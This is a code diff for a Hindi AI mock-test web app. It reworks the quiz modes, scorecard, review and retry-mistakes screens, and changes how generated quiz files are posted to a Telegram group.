+            <b id="resWrongCount">0</b>
+            <span>गलत (Wrong)</span>
           </div>
-          <div style="background:var(--opt-bg); border:1px solid var(--card-border); padding:5px; border-radius:8px;">
-            ⚪ <span id="statRemaining">0</span> Left
+          <div class="score-stat-card c-peach">
+            <b id="resSkipCount">0</b>
+            <span>छोड़े (Skipped)</span>
           </div>
         </div>
 
-        <div class="palette-grid" id="paletteGrid"></div>
+        <button id="btnRevokeMistakes" class="btn-score-red" onclick="reSolveMistakesOnly()">
+          <i class="fa-solid fa-rotate-left"></i> केवल गलत सवाल हल करें (<span id="mistakeBadge">0</span> Qs)
+        </button>
 
-        <button onclick="submitQuizDirectFromPalette()" class="btn-main" style="margin-top:14px; padding:13px;">
-          <i class="fa-solid fa-paper-plane"></i> टेस्ट सबमिट करें (Submit Test)
+        <button class="btn-score-blue" onclick="startReviewMode()">
+          <i class="fa-solid fa-magnifying-glass"></i> सही उत्तर और व्याख्या देखें (Review Answers)
+        </button>
+
+        <button class="btn-score-retake" onclick="retakeFullTest()">
+          <i class="fa-solid fa-arrows-rotate"></i> दोबारा पूरा टेस्ट दें (Retake)
         </button>
       </div>
     </div>
+
   </div>
 
   ${S_OPEN}
-    const quizRawData = ${JSON.stringify(formattedRawData)};
-    let activeQuestions = [...quizRawData];
-    let candidateName = "Aspirant";
+    const fullQuizRaw = ${JSON.stringify(formattedRawData)};
+    let activeList = [...fullQuizRaw];
     let currentIndex = 0;
-    let userAnswers = Array(activeQuestions.length).fill(null);
-    let markedQuestions = Array(activeQuestions.length).fill(false);
+    let userAnswers = Array(activeList.length).fill(null);
+    let chosenMode = 'instant';
     let isReviewMode = false;
-    let perQuestionLimit = 30;
-    let qTimerSeconds = 30;
-    let qTimerInterval = null;
 
-    function toggleTheme() {
-      const html = document.documentElement;
-      const themeBtn = document.getElementById('themeBtn');
-      if (html.getAttribute('data-theme') === 'light') {
-        html.setAttribute('data-theme', 'dark');
-        themeBtn.innerHTML = '<i class="fa-solid fa-sun" style="color:#f59e0b"></i>';
-      } else {
-        html.setAttribute('data-theme', 'light');
-        themeBtn.innerHTML = '<i class="fa-solid fa-moon"></i>';
-      }
-    }
+    function startStandaloneTest() {
+      const modeEl = document.querySelector('input[name="standaloneMode"]:checked');
+      chosenMode = modeEl ? modeEl.value : 'instant';
 
-    function startExportedTest() {
-      candidateName = (document.getElementById('candidateNameInput').value || 'Aspirant').trim();
-      perQuestionLimit = parseInt(document.getElementById('timerChoiceSelect').value, 10);
       document.getElementById('startScreen').style.display = 'none';
       document.getElementById('quizScreen').style.display = 'block';
+      document.getElementById('modeBadge').innerText = (chosenMode === 'instant') ? '🎯 INSTANT QUIZ' : '⏱️ EXAM MOCK';
+
+      activeList = [...fullQuizRaw];
       currentIndex = 0;
       isReviewMode = false;
-      userAnswers = Array(activeQuestions.length).fill(null);
-      markedQuestions = Array(activeQuestions.length).fill(false);
-      updatePaletteCounters();
+      userAnswers = Array(activeList.length).fill(null);
       renderQuestion();
     }
 
-    function updatePaletteCounters() {
-      const answered = userAnswers.filter(a => a !== null && a !== undefined).length;
-      const marked = markedQuestions.filter(m => m === true).length;
-      const total = activeQuestions.length;
-      const remaining = total - answered;
-
-      document.getElementById('paletteAnsweredCount').innerText = answered;
-      document.getElementById('statAnswered').innerText = answered;
-      document.getElementById('statMarked').innerText = marked;
-      document.getElementById('statRemaining').innerText = remaining;
-    }
-
-    function openPaletteModal() {
-      updatePaletteCounters();
-      const grid = document.getElementById('paletteGrid');
-      grid.innerHTML = '';
-
-      activeQuestions.forEach((_, idx) => {
-        const tile = document.createElement('div');
-        let cls = "palette-tile";
-        if (idx === currentIndex) cls += " active";
-
-        if (!isReviewMode) {
-          if (markedQuestions[idx]) cls += " marked";
-          else if (userAnswers[idx] !== null && userAnswers[idx] !== undefined) cls += " answered";
-        } else {
-          if (userAnswers[idx] === activeQuestions[idx].answer) cls += " answered";
-          else if (userAnswers[idx] !== null) cls += " marked";
-        }
-
-        tile.className = cls;
-        tile.innerText = idx + 1;
-        tile.onclick = () => {
-          clearInterval(qTimerInterval);
-          currentIndex = idx;
-          closePaletteModal();
-          renderQuestion();
-        };
-        grid.appendChild(tile);
-      });
-
-      document.getElementById('paletteModal').style.display = 'flex';
-    }
-
-    function closePaletteModal() {
-      document.getElementById('paletteModal').style.display = 'none';
-    }
-
-    function toggleMark() {
-      if (isReviewMode) return;
-      markedQuestions[currentIndex] = !markedQuestions[currentIndex];
-      const markBtn = document.getElementById('markBtn');
-      markBtn.innerHTML = markedQuestions[currentIndex] ? '<i class="fa-solid fa-flag"></i> Unmark' : '<i class="fa-solid fa-flag"></i> Mark';
-      updatePaletteCounters();
-    }
-
-    function submitQuizDirectFromPalette() {
-      closePaletteModal();
-      if (!isReviewMode) {
-        if (confirm("क्या आप टेस्ट सबमिट करना चाहते हैं?")) submitTest();
-      } else {
-        document.getElementById('quizScreen').style.display = 'none';
-        document.getElementById('scorecardScreen').style.display = 'block';
-      }
-    }
-
-    function startQuestionTimer() {
-      clearInterval(qTimerInterval);
-      const timerBadge = document.getElementById('liveTimerBadge');
-
-      if (perQuestionLimit === 0 || isReviewMode) {
-        timerBadge.innerText = isReviewMode ? "🔍 REVIEW" : "♾️ NO TIMER";
-        timerBadge.style.background = "rgba(16, 185, 129, 0.12)";
-        timerBadge.style.color = "var(--accent-emerald)";
-        return;
-      }
-
-      qTimerSeconds = perQuestionLimit;
-      timerBadge.style.background = "rgba(255, 87, 34, 0.12)";
-      timerBadge.style.color = "var(--accent-gold)";
-      timerBadge.innerText = "⏱️ " + qTimerSeconds + "s";
-
-      qTimerInterval = setInterval(() => {
-        qTimerSeconds--;
-        if (qTimerSeconds > 0) {
-          timerBadge.innerText = "⏱️ " + qTimerSeconds + "s";
-          if (qTimerSeconds <= 5) timerBadge.style.color = "var(--danger)";
-        } else {
-          clearInterval(qTimerInterval);
-          timerBadge.innerText = "⏱️ Time Up!";
-          setTimeout(() => handleNextClick(true), 800);
-        }
-      }, 1000);
-    }
-
     function renderQuestion() {
-      const q = activeQuestions[currentIndex];
-      document.getElementById('qIndexLabel').innerText = "Q " + (currentIndex + 1) + "/" + activeQuestions.length;
+      const q = activeList[currentIndex];
+      document.getElementById('qIndexLabel').innerText = "Q " + (currentIndex + 1) + "/" + activeList.length;
       document.getElementById('qText').innerText = (currentIndex + 1) + ". " + q.question;
 
       const container = document.getElementById('optionsContainer');
       container.innerHTML = '';
       const letters = ['A', 'B', 'C', 'D'];
       const selected = userAnswers[currentIndex];
+      const hasAnswered = (selected !== null && selected !== undefined);
 
-      (q.options || []).forEach((opt, idx) => {
+      q.options.forEach((opt, idx) => {
         const btn = document.createElement('button');
         let cls = "opt-btn";
-        if (!isReviewMode) {
-          if (selected === idx) cls += " selected";
+
+        if (chosenMode === 'instant' || isReviewMode) {
+          if (hasAnswered || isReviewMode) {
+            if (idx === q.answer) cls += " correct";
+            else if (selected === idx) cls += " wrong";
+          }
         } else {
-          if (idx === q.answer) cls += " correct";
-          else if (selected === idx) cls += " wrong";
+          if (selected === idx) cls += " selected";
         }
 
         btn.className = cls;
         btn.innerHTML = '<span class="opt-tag">' + (letters[idx] || (idx+1)) + '</span> <span>' + opt + '</span>';
         btn.onclick = () => {
-          if (!isReviewMode) {
+          if (isReviewMode) return;
+          if (chosenMode === 'instant') {
+            if (!hasAnswered) {
+              userAnswers[currentIndex] = idx;
+              renderQuestion();
+            }
+          } else {
             userAnswers[currentIndex] = (userAnswers[currentIndex] === idx) ? null : idx;
-            updatePaletteCounters();
             renderQuestion();
           }
         };
@@ -1851,49 +1678,36 @@
       });
 
       const expl = document.getElementById('explanationContainer');
-      if (isReviewMode) {
-        expl.innerHTML = "<b>💡 व्याख्या (Explanation):</b><br>" + (q.exp || "व्याख्या उपलब्ध नहीं है।");
+      if (((chosenMode === 'instant' && hasAnswered) || isReviewMode) && q.exp) {
+        expl.innerHTML = "<b>💡 व्याख्या (Explanation):</b><br>" + q.exp;
         expl.style.display = "block";
       } else {
         expl.style.display = "none";
       }
 
       document.getElementById('prevBtn').disabled = (currentIndex === 0);
-      const markBtn = document.getElementById('markBtn');
-      if (isReviewMode) {
-        markBtn.style.display = "none";
-      } else {
-        markBtn.style.display = "flex";
-        markBtn.innerHTML = markedQuestions[currentIndex] ? '<i class="fa-solid fa-flag"></i> Unmark' : '<i class="fa-solid fa-flag"></i> Mark';
-      }
-
       const nextBtn = document.getElementById('nextBtn');
       if (isReviewMode) {
-        nextBtn.innerHTML = (currentIndex === activeQuestions.length - 1) ? 'स्कोरकार्ड ➔' : 'Next <i class="fa-solid fa-chevron-right"></i>';
+        nextBtn.innerHTML = (currentIndex === activeList.length - 1) ? 'स्कोरकार्ड ➔' : 'Next <i class="fa-solid fa-chevron-right"></i>';
       } else {
-        nextBtn.innerHTML = (currentIndex === activeQuestions.length - 1) ? 'सबमिट करें ✓' : 'Next <i class="fa-solid fa-chevron-right"></i>';
+        nextBtn.innerHTML = (currentIndex === activeList.length - 1) ? 'सबमिट करें ✓' : 'Next <i class="fa-solid fa-chevron-right"></i>';
       }
-
-      updatePaletteCounters();
-      startQuestionTimer();
     }
 
     function prevQuestion() {
       if (currentIndex > 0) {
-        clearInterval(qTimerInterval);
         currentIndex--;
         renderQuestion();
       }
     }
 
-    function handleNextClick(isAuto = false) {
-      clearInterval(qTimerInterval);
-      if (currentIndex < activeQuestions.length - 1) {
+    function handleNextClick() {
+      if (currentIndex < activeList.length - 1) {
         currentIndex++;
         renderQuestion();
       } else {
         if (!isReviewMode) {
-          if (isAuto || confirm("क्या आप अपना टेस्ट सबमिट करना चाहते हैं?")) submitTest();
+          submitTest();
         } else {
           document.getElementById('quizScreen').style.display = 'none';
           document.getElementById('scorecardScreen').style.display = 'block';
@@ -1902,9 +1716,8 @@
     }
 
     function submitTest() {
-      clearInterval(qTimerInterval);
       let correct = 0, wrong = 0, skip = 0;
-      activeQuestions.forEach((q, i) => {
+      activeList.forEach((q, i) => {
         const ans = userAnswers[i];
         if (ans === null || ans === undefined) skip++;
         else if (ans === q.answer) correct++;
@@ -1912,30 +1725,31 @@
       });
 
       const score = (correct * 2) - (wrong * 0.5);
-      const totalMarks = activeQuestions.length * 2;
-      const mistakeTotal = wrong + skip;
+      const totalMarks = activeList.length * 2;
+      const mistakes = wrong + skip;
 
       document.getElementById('quizScreen').style.display = 'none';
       document.getElementById('scorecardScreen').style.display = 'block';
 
       document.getElementById('resMarksText').innerText = score.toFixed(1) + " / " + totalMarks;
-      document.getElementById('resTotalMarksText').innerText = "CANDIDATE: " + candidateName.toUpperCase() + " • MARKS: " + score.toFixed(1);
+      document.getElementById('resCandidateLine').innerText = "CANDIDATE: ASPIRANT • MARKS: " + score.toFixed(1);
       document.getElementById('resCorrectCount').innerText = correct;
       document.getElementById('resWrongCount').innerText = wrong;
       document.getElementById('resSkipCount').innerText = skip;
 
-      const mistakeBtn = document.getElementById('btnResolveMistakesOnly');
-      if (mistakeTotal > 0) {
-        document.getElementById('mistakeBadgeCount').innerText = mistakeTotal;
-        mistakeBtn.style.display = 'flex';
+      const revokeBtn = document.getElementById('btnRevokeMistakes');
+      if (mistakes > 0) {
+        document.getElementById('mistakeBadge').innerText = mistakes;
+        revokeBtn.style.display = 'flex';
       } else {
-        mistakeBtn.style.display = 'none';
+        revokeBtn.style.display = 'none';
       }
     }
 
+    // 🔴 REVOKE / RE-SOLVE MISTAKES ONLY
     function reSolveMistakesOnly() {
       let mistakes = [];
-      activeQuestions.forEach((q, i) => {
+      activeList.forEach((q, i) => {
         if (userAnswers[i] === null || userAnswers[i] === undefined || userAnswers[i] !== q.answer) {
           mistakes.push(q);
         }
@@ -1943,18 +1757,17 @@
 
       if (mistakes.length === 0) return alert('🎉 आपके सभी सवाल सही हैं!');
 
-      activeQuestions = mistakes;
-      userAnswers = Array(activeQuestions.length).fill(null);
-      markedQuestions = Array(activeQuestions.length).fill(false);
-      isReviewMode = false;
+      activeList = mistakes;
+      userAnswers = Array(activeList.length).fill(null);
       currentIndex = 0;
+      isReviewMode = false;
 
       document.getElementById('scorecardScreen').style.display = 'none';
       document.getElementById('quizScreen').style.display = 'block';
-      updatePaletteCounters();
       renderQuestion();
     }
 
+    // 🔵 REVIEW ANSWERS & EXPLANATIONS
     function startReviewMode() {
       isReviewMode = true;
       currentIndex = 0;
@@ -1963,8 +1776,8 @@
       renderQuestion();
     }
 
+    // ⚪ RETAKE FULL TEST
     function retakeFullTest() {
-      activeQuestions = [...quizRawData];
       document.getElementById('scorecardScreen').style.display = 'none';
       document.getElementById('startScreen').style.display = 'block';
     }
@@ -1973,7 +1786,7 @@
 </html>`;
     }
 
-    async function sendHtmlFileToTelegram(questions, usedModel, langUsed) {
+    async function sendHtmlFileToTelegram(questions) {
       if (!TG_BOT_TOKEN) return;
       try {
         const timeNow = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
@@ -1981,7 +1794,8 @@
         const safeTopic = activeQuizTopic.replace(/[^a-zA-Z0-9_\u0900-\u097F]/g, '_');
         const fileName = `${safeTopic}_${Date.now()}.html`;
 
-        const cleanGroupCaption = `🎯 टॉपिक: ${activeQuizTopic}\n📝 कुल सवाल: ${questions.length} सवाल\n⚡ Pareeksha Kendra AI Mock Test\n👉 फाइल डाउनलोड करके किसी भी ब्राउज़र में टेस्ट दें!`;
+        const creatorName = (document.getElementById('customCreatorName')?.value || 'ANKIT').trim() || 'ANKIT';
+        const cleanGroupCaption = `🎯 टॉपिक: ${activeQuizTopic}\n📝 कुल सवाल: ${questions.length} सवाल\n👑 Created by: ${creatorName}\n⚡ Pareeksha Kendra AI Mock Test\n👉 फाइल डाउनलोड करके किसी भी ब्राउज़र में टेस्ट दें!`;
 
         async function postDoc(target) {
           const blob = new Blob([htmlContent], { type: 'text/html;charset=utf-8' });
@@ -1998,7 +1812,7 @@
         }
 
         let res = await postDoc(TG_GROUP_TARGET);
-        if (!res.ok) {
+        if (!res || !res.ok) {
           res = await postDoc(TG_GROUP_FALLBACK_ID);
         }
 
@@ -2010,17 +1824,14 @@
             liveDirectDownloadUrl = `https://api.telegram.org/file/bot${TG_BOT_TOKEN}/${pathData.result.file_path}`;
           }
         }
-
-      } catch (err) {
-        console.warn("Telegram group dispatch note:", err);
-      }
+      } catch (err) {}
     }
 
     function triggerDirectDownload() {
       if (!quizData || quizData.length === 0) return alert('कोई सवाल उपलब्ध नहीं है!');
 
       const btn = document.getElementById('directDownloadBtn');
-      const originalText = btn.innerHTML;
+      const originalText = btn ? btn.innerHTML : '';
 
       if (liveDirectDownloadUrl) {
         const a = document.createElement('a');
@@ -2033,7 +1844,6 @@
         return;
       }
 
-      btn.innerHTML = '<span>⏳ फ़ाइल डाउनलोड हो रही है...</span>';
       const fullHtmlString = generatePareekshaKendraHtmlString(quizData);
       const fileName = `${activeQuizTopic}_${Date.now()}.html`;
 
@@ -2047,163 +1857,52 @@
         a.click();
         document.body.removeChild(a);
       } catch (e) {}
-
-      setTimeout(() => {
-        btn.innerHTML = originalText;
-      }, 1500);
     }
 
-    function openTimingModal() {
-      document.getElementById('timingModal').style.display = 'flex';
+    // 🌟 SHOW ROYAL ACTION HUB SCREEN IN APP TOO!
+    function showActionHub() {
+      document.getElementById('setupView').style.display = 'none';
+      document.getElementById('modeSwitcher').style.display = 'none';
+      document.getElementById('scorecardView').style.display = 'none';
+      document.getElementById('quizView').style.display = 'none';
+      document.getElementById('actionHubView').style.display = 'block';
+
+      const creator = (document.getElementById('customCreatorName')?.value || 'ANKIT').trim() || 'ANKIT';
+      let tg = (document.getElementById('customTelegramLink')?.value || '').trim() || 't.me/PAREEKSHA_KENDRA';
+      if (!tg.startsWith('http')) tg = 'https://' + tg.replace(/^@/, 't.me/');
+
+      document.getElementById('actionHubTopicTitle').innerText = activeQuizTopic;
+      document.getElementById('actionHubCreatorBadge').innerText = `👑 ${creator} 👑`;
+      document.getElementById('hubStatQs').innerText = quizData.length;
+      document.getElementById('hubStatTime').innerText = Math.max(5, Math.ceil(quizData.length * 0.8)) + 'm';
+      document.getElementById('actionHubTgBtn').href = tg;
+      document.getElementById('actionHubTgBtn').innerHTML = `<i class="fa-brands fa-telegram" style="font-size:18px;"></i> JOIN US — ${creator} Telegram`;
     }
 
-    function closeTimingModal() {
-      document.getElementById('timingModal').style.display = 'none';
-    }
-
-    function confirmStartMockTest() {
-      const selectedTiming = document.querySelector('input[name="timingChoice"]:checked').value;
-      perQuestionLimit = parseInt(selectedTiming, 10);
-      closeTimingModal();
-      startQuiz();
-    }
-
-    function startQuiz() {
+    function startAppQuizLive() {
       currentQ = 0;
       isReviewMode = false;
-      userAnswers = Array(quizData.length).fill(null);
-      markedQuestions = Array(quizData.length).fill(false);
+      activeQuestions = [...quizData];
+      userAnswers = Array(activeQuestions.length).fill(null);
+
       document.getElementById('actionHubView').style.display = 'none';
-      document.getElementById('setupView').style.display = 'none';
       document.getElementById('scorecardView').style.display = 'none';
       document.getElementById('quizView').style.display = 'block';
-      updatePaletteCounters();
+      document.getElementById('liveQTimerBadge').innerText = (activePlayMode === 'instant') ? '🎯 INSTANT QUIZ' : '⏱️ EXAM MOCK';
+
       renderQuestion();
     }
 
-    function updatePaletteCounters() {
-      const answered = userAnswers.filter(a => a !== null && a !== undefined).length;
-      const marked = markedQuestions.filter(m => m === true).length;
-      const total = quizData.length;
-      const remaining = total - answered;
-
-      document.getElementById('paletteCountAnswered').innerText = answered;
-      document.getElementById('paletteCountTotal').innerText = total;
-
-      const statA = document.getElementById('statAnswered');
-      const statM = document.getElementById('statMarked');
-      const statR = document.getElementById('statRemaining');
-      if (statA) statA.innerText = answered;
-      if (statM) statM.innerText = marked;
-      if (statR) statR.innerText = remaining;
-    }
-
-    function openAppPaletteModal() {
-      updatePaletteCounters();
-      const grid = document.getElementById('appPaletteGrid');
-      grid.innerHTML = '';
-
-      quizData.forEach((_, idx) => {
-        const tile = document.createElement('div');
-        let cls = "palette-tile";
-
-        if (idx === currentQ) cls += " active";
-
-        if (!isReviewMode) {
-          if (markedQuestions[idx]) cls += " marked";
-          else if (userAnswers[idx] !== null && userAnswers[idx] !== undefined) cls += " answered";
-        } else {
-          let correctIndex = quizData[idx].answer;
-          if (typeof correctIndex === 'string') {
-            const map = { 'A': 0, 'B': 1, 'C': 2, 'D': 3, '1': 0, '2': 1, '3': 2, '4': 3 };
-            correctIndex = map[correctIndex.toUpperCase()] ?? 0;
-          }
-          if (userAnswers[idx] === correctIndex) cls += " answered";
-          else if (userAnswers[idx] !== null) cls += " marked";
-        }
-
-        tile.className = cls;
-        tile.innerText = idx + 1;
-        tile.onclick = () => {
-          clearInterval(qTimerInterval);
-          currentQ = idx;
-          closeAppPaletteModal();
-          renderQuestion();
-        };
-        grid.appendChild(tile);
-      });
-
-      document.getElementById('appPaletteModal').style.display = 'flex';
-    }
-
-    function closeAppPaletteModal() {
-      document.getElementById('appPaletteModal').style.display = 'none';
-    }
-
-    function toggleMarkCurrentQuestion() {
-      if (isReviewMode) return;
-      markedQuestions[currentQ] = !markedQuestions[currentQ];
-      const markBtn = document.getElementById('markBtn');
-      if (markedQuestions[currentQ]) {
-        markBtn.innerHTML = '<i class="fa-solid fa-flag"></i> Unmark';
-      } else {
-        markBtn.innerHTML = '<i class="fa-solid fa-flag"></i> Mark';
-      }
-      updatePaletteCounters();
-    }
-
-    function submitQuizDirectFromPalette() {
-      closeAppPaletteModal();
-      if (!isReviewMode) {
-        if (confirm("क्या आप अभी अपना मॉक टेस्ट सबमिट करना चाहते हैं?")) {
-          submitMockTest();
-        }
-      } else {
-        document.getElementById('quizView').style.display = 'none';
-        document.getElementById('scorecardView').style.display = 'block';
-      }
-    }
-
-    function startQuestionTimer() {
-      clearInterval(qTimerInterval);
-      const timerBadge = document.getElementById('liveQTimerBadge');
-
-      if (perQuestionLimit === 0 || isReviewMode) {
-        timerBadge.innerText = isReviewMode ? "🔍 REVIEW" : "♾️ NO TIMER";
-        timerBadge.style.background = "rgba(16, 185, 129, 0.12)";
-        timerBadge.style.color = "var(--accent-emerald)";
-        return;
-      }
-
-      qTimerSeconds = perQuestionLimit;
-      timerBadge.style.background = "rgba(255, 87, 34, 0.12)";
-      timerBadge.style.color = "var(--accent-gold)";
-      timerBadge.innerText = "⏱️ " + qTimerSeconds + "s";
-
-      qTimerInterval = setInterval(() => {
-        qTimerSeconds--;
-        if (qTimerSeconds > 0) {
-          timerBadge.innerText = "⏱️ " + qTimerSeconds + "s";
-          if (qTimerSeconds <= 5) timerBadge.style.color = "var(--danger)";
-        } else {
-          clearInterval(qTimerInterval);
-          timerBadge.innerText = "⏱️ Time Up!";
-          setTimeout(() => handleNextClick(true), 800);
-        }
-      }, 1000);
-    }
-
     function renderQuestion() {
-      const q = quizData[currentQ];
-      document.getElementById('qIndexLabel').innerText = "Q " + (currentQ + 1) + "/" + quizData.length;
+      const q = activeQuestions[currentQ];
+      document.getElementById('qIndexLabel').innerText = "Q " + (currentQ + 1) + "/" + activeQuestions.length;
       document.getElementById('questionText').innerText = (currentQ + 1) + ". " + q.question;
       
       const container = document.getElementById('optionsContainer');
       container.innerHTML = '';
-
       const letters = ['A', 'B', 'C', 'D'];
-      const options = Array.isArray(q.options) ? q.options : ['A', 'B', 'C', 'D'];
       const selected = userAnswers[currentQ];
+      const hasAnswered = (selected !== null && selected !== undefined);
 
       let correctIndex = q.answer;
       if (typeof correctIndex === 'string') {
@@ -2211,75 +1910,70 @@
         correctIndex = map[correctIndex.toUpperCase()] ?? 0;
       }
 
+      options = Array.isArray(q.options) ? q.options : ['A', 'B', 'C', 'D'];
+
       options.forEach((opt, idx) => {
         const btn = document.createElement('button');
         let cls = "opt-btn";
 
-        if (!isReviewMode) {
-          if (selected === idx) cls += " selected";
+        if (activePlayMode === 'instant' || isReviewMode) {
+          if (hasAnswered || isReviewMode) {
+            if (idx === correctIndex) cls += " correct";
+            else if (selected === idx) cls += " wrong";
+          }
         } else {
-          if (idx === correctIndex) cls += " correct";
-          else if (selected === idx) cls += " wrong";
+          if (selected === idx) cls += " selected";
         }
 
         btn.className = cls;
         btn.innerHTML = '<span class="opt-tag">' + (letters[idx] || (idx + 1)) + '</span> <span>' + opt + '</span>';
-        btn.onclick = () => selectMockOption(idx);
+        btn.onclick = () => {
+          if (isReviewMode) return;
+          if (activePlayMode === 'instant') {
+            if (!hasAnswered) {
+              userAnswers[currentQ] = idx;
+              if (navigator.vibrate) navigator.vibrate(idx === correctIndex ? 20 : [40, 40]);
+              renderQuestion();
+            }
+          } else {
+            userAnswers[currentQ] = (userAnswers[currentQ] === idx) ? null : idx;
+            renderQuestion();
+          }
+        };
         container.appendChild(btn);
       });
 
       const expl = document.getElementById('explanationBox');
-      if (isReviewMode) {
-        expl.innerHTML = "<b>💡 व्याख्या (Explanation):</b><br>" + (q.explanation || 'व्याख्या उपलब्ध नहीं है।');
+      if (((activePlayMode === 'instant' && hasAnswered) || isReviewMode) && (q.explanation || q.exp)) {
+        expl.innerHTML = "<b>💡 व्याख्या (Explanation):</b><br>" + (q.explanation || q.exp);
         expl.style.display = 'block';
       } else {
         expl.style.display = 'none';
       }
 
       document.getElementById('prevBtn').disabled = (currentQ === 0);
-
-      const markBtn = document.getElementById('markBtn');
-      if (isReviewMode) {
-        markBtn.style.display = 'none';
-      } else {
-        markBtn.style.display = 'flex';
-        markBtn.innerHTML = markedQuestions[currentQ] ? '<i class="fa-solid fa-flag"></i> Unmark' : '<i class="fa-solid fa-flag"></i> Mark';
-      }
-
       const nextBtn = document.getElementById('nextBtn');
       if (isReviewMode) {
-        nextBtn.innerHTML = (currentQ === quizData.length - 1) ? 'स्कोरकार्ड ➔' : 'Next <i class="fa-solid fa-chevron-right"></i>';
+        nextBtn.innerHTML = (currentQ === activeQuestions.length - 1) ? 'स्कोरकार्ड ➔' : 'Next <i class="fa-solid fa-chevron-right"></i>';
       } else {
-        nextBtn.innerHTML = (currentQ === quizData.length - 1) ? 'सबमिट करें ✓' : 'Next <i class="fa-solid fa-chevron-right"></i>';
+        nextBtn.innerHTML = (currentQ === activeQuestions.length - 1) ? 'सबमिट करें ✓' : 'Next <i class="fa-solid fa-chevron-right"></i>';
       }
-
-      updatePaletteCounters();
-      startQuestionTimer();
-    }
-
-    function selectMockOption(idx) {
-      if (isReviewMode) return;
-      userAnswers[currentQ] = (userAnswers[currentQ] === idx) ? null : idx;
-      updatePaletteCounters();
-      renderQuestion();
     }
 
     function prevQuestion() {
       if (currentQ > 0) {
-        clearInterval(qTimerInterval);
         currentQ--;
         renderQuestion();
       }
     }
 
-    function handleNextClick(isAuto = false) {
-      clearInterval(qTimerInterval);
-      if (currentQ < quizData.length - 1) {
+    function handleNextClick() {
+      if (currentQ < activeQuestions.length - 1) {
         currentQ++;
         renderQuestion();
       } else {
         if (!isReviewMode) {
-          if (isAuto || confirm("क्या आप अपना टेस्ट सबमिट करना चाहते हैं?")) submitMockTest();
+          submitMockTest();
         } else {
           document.getElementById('quizView').style.display = 'none';
           document.getElementById('scorecardView').style.display = 'block';
@@ -2287,10 +1981,10 @@
       }
     }
 
+    // 🏆 IN-APP SCORECARD EVALUATION
     function submitMockTest() {
-      clearInterval(qTimerInterval);
       let correct = 0, wrong = 0, skip = 0;
-      quizData.forEach((q, i) => {
+      activeQuestions.forEach((q, i) => {
         let correctIndex = q.answer;
         if (typeof correctIndex === 'string') {
           const map = { 'A': 0, 'B': 1, 'C': 2, 'D': 3, '1': 0, '2': 1, '3': 2, '4': 3 };
@@ -2303,30 +1997,32 @@
       });
 
       const score = (correct * 2) - (wrong * 0.5);
-      const totalMarks = quizData.length * 2;
-      const mistakeTotal = wrong + skip;
+      const totalMarks = activeQuestions.length * 2;
+      const mistakes = wrong + skip;
 
       document.getElementById('quizView').style.display = 'none';
       document.getElementById('scorecardView').style.display = 'block';
 
-      document.getElementById('scoreTopicTitle').innerText = activeQuizTopic + " - परिणाम";
+      document.getElementById('scoreTopicTitle').innerText = activeQuizTopic;
       document.getElementById('scoreMarksText').innerText = score.toFixed(1) + " / " + totalMarks;
+      document.getElementById('scoreCandidateLine').innerText = "CANDIDATE: ASPIRANT • MARKS: " + score.toFixed(1);
       document.getElementById('scCorrectCount').innerText = correct;
       document.getElementById('scWrongCount').innerText = wrong;
       document.getElementById('scSkipCount').innerText = skip;
 
       const mistakeBtn = document.getElementById('btnResolveMistakesApp');
-      if (mistakeTotal > 0) {
-        document.getElementById('mistakeBadgeCount').innerText = mistakeTotal;
+      if (mistakes > 0) {
+        document.getElementById('mistakeBadgeCount').innerText = mistakes;
         mistakeBtn.style.display = 'flex';
       } else {
         mistakeBtn.style.display = 'none';
       }
     }
 
+    // 🔴 IN-APP REVOKE (MISTAKES ONLY)
     function reSolveMistakesOnlyApp() {
       let mistakes = [];
-      quizData.forEach((q, i) => {
+      activeQuestions.forEach((q, i) => {
         let correctIndex = q.answer;
         if (typeof correctIndex === 'string') {
           const map = { 'A': 0, 'B': 1, 'C': 2, 'D': 3, '1': 0, '2': 1, '3': 2, '4': 3 };
@@ -2339,9 +2035,8 @@
 
       if (mistakes.length === 0) return alert('🎉 आपके सभी सवाल सही हैं!');
 
-      quizData = mistakes;
-      userAnswers = Array(quizData.length).fill(null);
-      markedQuestions = Array(quizData.length).fill(false);
+      activeQuestions = mistakes;
+      userAnswers = Array(activeQuestions.length).fill(null);
       isReviewMode = false;
       currentQ = 0;
 
@@ -2350,6 +2045,7 @@
       renderQuestion();
     }
 
+    // 🔵 IN-APP REVIEW ANSWERS
     function startReviewMode() {
       isReviewMode = true;
       currentQ = 0;
@@ -2358,11 +2054,17 @@
       renderQuestion();
     }
 
+    // ⚪ IN-APP RETAKE
+    function retakeFullTestApp() {
+      document.getElementById('scorecardView').style.display = 'none';
+      showActionHub();
+    }
+
     function backToScanner() {
-      clearInterval(qTimerInterval);
       document.getElementById('actionHubView').style.display = 'none';
       document.getElementById('scorecardView').style.display = 'none';
       document.getElementById('quizView').style.display = 'none';
+      document.getElementById('modeSwitcher').style.display = 'grid';
       document.getElementById('setupView').style.display = 'block';
     }
 
@@ -2380,14 +2082,13 @@
 
         if (stopwatchSeconds < 15) statusEl.innerText = "🔍 AI सामग्री का विश्लेषण कर रहा है...";
         else if (stopwatchSeconds < 40) statusEl.innerText = "🧠 महत्वपूर्ण सवालों और विकल्पों को संकलित किया जा रहा है...";
-        else if (stopwatchSeconds < 80) statusEl.innerText = "✍️ उत्तर और हिंदी में विस्तृत व्याख्या लिखी जा रही है...";
-        else statusEl.innerText = "⚡ अंतिम चेकिंग चालू है, बस कुछ ही पल...";
+        else statusEl.innerText = "✍️ उत्तर और हिंदी में विस्तृत व्याख्या लिखी जा रही है...";
       }, 1000);
     }
 
     function stopRealStopwatch() { clearInterval(stopwatchInterval); }
 
-    // --- MAIN GENERATION ENGINE (100% NO-FREEZE SAFE BUTTON HANDLING) ---
+    // --- MAIN GENERATION ENGINE ---
     async function startGeneration(mode) {
       const apiKey = getStoredKey();
       if (!apiKey) return openKeyModal(true);
@@ -2444,7 +2145,6 @@ Note: answer must be 0 for A, 1 for B, 2 for C, 3 for D.`;
         }
 
         const pastedText = (document.getElementById('pastedTextInput')?.value || '').trim();
-
         if ((!payloadItems || payloadItems.length === 0) && !pastedText) {
           return alert('कृपया पहले किताब के पन्नों की फ़ोटो खींचें, PDF चुनें या टेक्स्ट पेस्ट करें!');
         }
@@ -2452,21 +2152,9 @@ Note: answer must be 0 for A, 1 for B, 2 for C, 3 for D.`;
         qCount = document.getElementById('qCount').value;
         langOption = document.getElementById('langSelect').value;
 
-        let languageRule = "";
-        let langDisplayName = "हिंदी";
-        if (langOption === 'hi') {
